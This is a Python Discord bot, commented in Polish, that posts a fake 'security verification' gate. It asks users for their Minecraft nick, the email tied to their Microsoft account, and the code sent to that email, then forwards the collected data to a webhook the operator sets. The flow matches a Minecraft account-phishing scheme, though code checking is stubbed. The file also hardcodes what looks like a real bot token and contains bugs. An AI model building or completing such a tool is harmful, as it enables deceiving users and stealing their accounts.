import discord
from discord import app_commands, ui
import json
import asyncio

# Ustawienia i Zmienne
TOKEN = 'MTQ1NTI0Njk0NDA5NTA0NzcxMQ.Gra-AP.p41ksg2oSjg-opT7nKrRkwDv95RWQH09iIIhz4'
WEBHOOK_URLS = {} # Słownik przechowujący URL-e webhooków powiązane z ID serwera/kanału
VERIFICATION_STATE = {} # Przechowuje stan weryfikacji dla każdego użytkownika

# Identyfikatory niestandardowych komponentów (dla zachowania ciągłości sesji)
CUSTOM_ID_NICK = "minecraft_nick_form"
CUSTOM_ID_EMAIL = "minecraft_email_form"
CUSTOM_ID_FINAL_VERIFY = "final_verification_button"

# --- Klasy UI ---

# 1. Pierwszy Formularz (Modal) dla Nicku
class NickModal(ui.Modal, title='Weryfikacja Minecraft'):
    minecraft_nick = ui.TextInput(
        label="Minecraft Nick:",
        placeholder="Wpisz swój nick w grze...",
        required=True,
        max_length=16
    )

    async def on_submit(self, interaction: discord.Interaction):
        nick = str(self.minecraft_nick)
        user_id = interaction.user.id
        
        # Zapisujemy tymczasowo nick i przechodzimy do etapu 2 (Email)
        VERIFICATION_STATE[user_id] = {
            'step': 2,
            'nick': nick,
            'webhook_data': {}, # Tutaj będą przechowywane dane z webhooka
            'initial_interaction': interaction
        }
        
        # Wysyłamy drugi Modal (Email)
        await interaction.response.send_modal(EmailModal())


# 2. Drugi Formularz (Modal) dla Emaila
class EmailModal(ui.Modal, title='Weryfikacja E-mail'):
    minecraft_email = ui.TextInput(
        label="Minecraft email:",
        placeholder="Wpisz swój email powiązany z kontem Microsoft...",
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        user_id = interaction.user.id
        if user_id not in VERIFICATION_STATE or VERIFICATION_STATE[user_id]['step'] != 2:
            # Zabezpieczenie, jeśli ktoś ominie pierwszą część
            return await interaction.response.send_message("Błąd sesji. Proszę spróbować ponownie.", ephemeral=True)

        email = str(self.minecraft_email)
        VERIFICATION_STATE[user_id]['email'] = email
        VERIFICATION_STATE[user_id]['step'] = 3 # Gotowy do generowania kodu

        # --- Tutaj należy zaimplementować logikę wysyłania kodu na podany email ---
        # W celach demonstracyjnych zakładamy, że kod jest generowany i użytkownik jest gotowy do wpisania go.
        
        # Wyświetlamy komunikat i przycisk do wpisania kodu
        initial_inter = VERIFICATION_STATE[user_id]['initial_interaction']
        
        await initial_inter.followup.send(
            content=f"Kod został wysłany na adres {email}. Wpisz go w poniższym formularzu.",
            view=VerificationCodeView(),
            ephemeral=True
        )

# 3. Widok z przyciskiem do wpisania kodu
class VerificationCodeView(ui.View):
    def __init__(self):
        super().__init__(timeout=180) # Timeout 3 minuty
        
    @ui.button(label="Wprowadź kod weryfikacyjny", style=discord.ButtonStyle.primary, custom_id="enter_code_button")
    async def submit_code_button(self, interaction: discord.Interaction, button: ui.Button):
        user_id = interaction.user.id
        if user_id not in VERIFICATION_STATE or VERIFICATION_STATE[user_id]['step'] != 3:
            return await interaction.response.send_message("To nie jest Twój etap weryfikacji.", ephemeral=True)
            
        # Wysłanie Modala dla Kodu
        await interaction.response.send_modal(CodeModal())


# 4. Formularz dla kodu
class CodeModal(ui.Modal, title='Kod Weryfikacyjny'):
    verification_code = ui.TextInput(
        label="Verification code from email:",
        placeholder="Wpisz kod otrzymany w skrzynce...",
        required=True,
        max_length=10
    )

    async def on_submit(self, interaction: discord.Interaction):
        user_id = interaction.user.id
        state = VERIFICATION_STATE.get(user_id)

        if not state or state['step'] != 3:
             return await interaction.response.send_message("Błąd sesji.", ephemeral=True)
        
        # --- Tutaj byłby sprawdzany faktyczny kod ---
        # Jeśli kod jest poprawny:
        
        final_data = {
            "Użytkownik Discord": interaction.user.display_name,
            "Minecraft Nick": state['nick'],
            "Email": state['email']
        }
        
        # Przekazujemy do funkcji wysyłającej podsumowanie
        await send_final_summary(interaction, final_data)
        
        # Usuwamy stan po zakończeniu
        del VERIFICATION_STATE[user_id]
        
        await interaction.response.send_message("Weryfikacja zakończona pomyślnie!", ephemeral=True)


# --- Funkcje Główne Bota ---

async def send_final_summary(interaction: discord.Interaction, data: dict):
    """Tworzy i wysyła embed z podsumowaniem przez odpowiedni webhook lub do kanału prywatnego."""
    
    webhook_target_id = interaction.channel_id # Zakładamy, że podsumowanie ma iść na kanał, gdzie kliknięto pierwszy przycisk
    
    if not webhook_target_id or webhook_target_id not in WEBHOOK_URLS:
        # Jeśli nie ma skonfigurowanego webhooka dla kanału, wysyłamy do użytkownika prywatnie (ephemeral)
        
        embed = discord.Embed(
            title="Verification Complete",
            description="Oto zebrane dane. Ten widok jest widoczny tylko dla Ciebie.",
            color=discord.Color.green()
        )
        
        details = "\n".join([f"**{k}**: {v}" for k, v in data.items()])
        embed.add_field(name="Zebrane Dane", value=details, inline=False)
        
        await interaction.channel.send(embed=embed, ephemeral=True)
        return


    # Jeśli jest skonfigurowany webhook, wysyłamy tam
    wh_url = WEBHOOK_URLS[webhook_target_id]
    webhook = discord.Webhook.from_url(wh_url, client=client)
    
    embed = discord.Embed(
        title="Weryfikacja Zakończona (Przez Webhook)",
        description=f"Dane użytkownika {data['Użytkownik Discord']} zostały zapisane.",
        color=discord.Color.blue()
    )
    
    details = "\n".join([f"**{k}**: {v}" for k, v in data.items()])
    embed.add_field(name="Zebrane Dane", value=details)

    await webhook.send(embed=embed, username="System Weryfikacyjny")


# --- Definicja Przycisków dla Wstępnego Uruchomienia ---

class InitialVerificationView(ui.View):
    def __init__(self):
        super().__init__(timeout=None) # Ustawiamy timeout na None, aby przyciski działały stale
        
    @ui.button(label="Zweryfikuj Minecraft", style=discord.ButtonStyle.success, custom_id=CUSTOM_ID_NICK)
    async def start_verification(self, interaction: discord.Interaction, button: ui.Button):
        user_id = interaction.user.id
        
        # Sprawdzamy, czy użytkownik już nie jest w trakcie weryfikacji
        if user_id in VERIFICATION_STATE:
            return await interaction.response.send_message("Jesteś już w trakcie procesu weryfikacji.", ephemeral=True)
            
        # Ustawiamy stan początkowy
        VERIFICATION_STATE[user_id] = {'step': 1, 'initial_interaction': interaction}
        
        # Wysłanie pierwszego Modala (Nick)
        await interaction.response.send_modal(NickModal())


# --- Główny Bot ---

class MyClient(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True # Wymagane do niektórych operacji
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def on_ready(self):
        print(f'Zalogowano jako {self.user} (ID: {self.user.id})')
        await self.tree.sync() # Synchronizacja komend slash
        print("Komendy synchronizowane.")
        # Tutaj musisz załadować trwałe widoki, jeśli bot się restartuje
        self.add_view(InitialVerificationView())
        
    async def on_interaction(self, interaction: discord.Interaction):
        # Jeśli interakcja nie jest komendą slash, ale komponentem (przycisk/select)
        if interaction.type == discord.InteractionType.component:
            if interaction.data['custom_id'] == CUSTOM_ID_NICK:
                # Ta logika jest powtarzana, ale w przypadku trwałych przycisków jest kluczowa
                if interaction.user.id not in VERIFICATION_STATE:
                    VERIFICATION_STATE[interaction.user.id] = {'step': 1, 'initial_interaction': interaction}
                    await interaction.response.send_modal(NickModal())
                else:
                    await interaction.response.send_message("Już w trakcie.", ephemeral=True)
            # Logika dla innych przycisków jest obsługiwana w klasach ui.View


client = MyClient()

# --- Komendy Slash ---

@client.tree.command(name="webhook", description="Dodaje/Usuwa powiązanie webhooka dla tego kanału.")
@app_commands.describe(url="Adres URL webhooka do zapisania (lub pusty, aby usunąć).")
@app_commands.checks.has_permissions(manage_webhooks=True)
async def set_webhook(interaction: discord.Interaction, url: str = None):
    channel_id = interaction.channel_id
    
    if url:
        # Prosta walidacja URL-a webhooka
        if "discord.com/api/webhooks/" in url:
            WEBHOOK_URLS[channel_id] = url
            await interaction.response.send_message(f"Webhook pomyślnie dodany do kanału {interaction.channel.mention}.", ephemeral=True)
        else:
            await interaction.response.send_message("Podany URL nie wygląda jak prawidłowy URL webhooka Discorda.", ephemeral=True)
    elif channel_id in WEBHOOK_URLS:
        del WEBHOOK_URLS[channel_id]
        await interaction.response.send_message(f"Webhook usunięty z kanału {interaction.channel.mention}.", ephemeral=True)
    else:
        await interaction.response.send_message("Nie znaleziono zapisanego webhooka dla tego kanału.", ephemeral=True)

@client.tree.command(name="embed", description="Wysyła wstępny przycisk weryfikacyjny do kanału.")
@app_commands.checks.has_permissions(send_messages=True)
async def send_initial_embed(interaction: discord.Interaction):
    
    # Wysyłamy wiadomość ze stałym przyciskiem.
    embed = discord.Embed(
        title="Weryfikacja Bezpieczeństwa",
        description="Aby uzyskać dostęp do pozostałych kanałów, musisz potwierdzić swoją tożsamość poprzez ten przycisk.",
        color=discord.Color.red()
    )
    
    view = InitialVerificationView()
    await interaction.response.send_message(embed=embed, view=view)

# UWAGA: Komenda /edit jest bardzo trudna do implementacji w sposób ciągły dla embedów innych osób.
# Najłatwiej jest edytować ten sam embed, który bot wysłał, ale wymaga to zapamiętania Message ID.
# Jeśli chcesz, aby /edit działał na *ostatnio wysłanym* embedzie przez bota, musimy dodać do stanu bota Message ID.

@client.tree.command(name="edit", description="Edytuje ostatnio wysłany embed (TYLKO JEŚLI BOT ZAPAMIĘTAŁ ID WIADOMOŚCI).")
@app_commands.describe(
    title="Nowy Tytuł",
    description="Nowy Opis",
    button_label="Nowy tekst na przycisku"
)
@app_commands.checks.has_permissions(manage_messages=True)
async def edit_last_embed(interaction: discord.Interaction, title: str, description: str, button_label: str):
    # W tym uproszczonym kodzie zakładamy, że komenda /edit jest używana na kanale,
    # na którym była ostatnia wiadomość z przyciskiem weryfikacyjnym.
    
    # Szukanie ostatniej wiadomości bota z naszym widokiem (Wymaga dostępu do historii kanału)
    async for message in interaction.channel.history(limit=20):
        if message.author.id == client.user.id and message.components:
            
            # Sprawdzamy, czy to jest wiadomość z naszym widokiem weryfikacyjnym
            if message.components[0].children[0].custom_id == CUSTOM_ID_NICK:
                
                new_embed = discord.Embed(title=title, description=description, color=discord.Color.orange())
                
                # Tworzymy nowy widok z nowym tekstem na przycisku
                new_view = InitialVerificationView()
                new_view.children[0].label = button_label
                
                await message.edit(embed=new_embed, view=new_view)
                return await interaction.response.send_message("Embed został zaktualizowany.", ephemeral=True)
                
    await interaction.response.send_message("Nie znaleziono poprzedniej wiadomości weryfikacyjnej do edycji w ostatnich 20 wiadomościach.", ephemeral=True)


if __name__ == '__main__':
    client.run(TOKEN)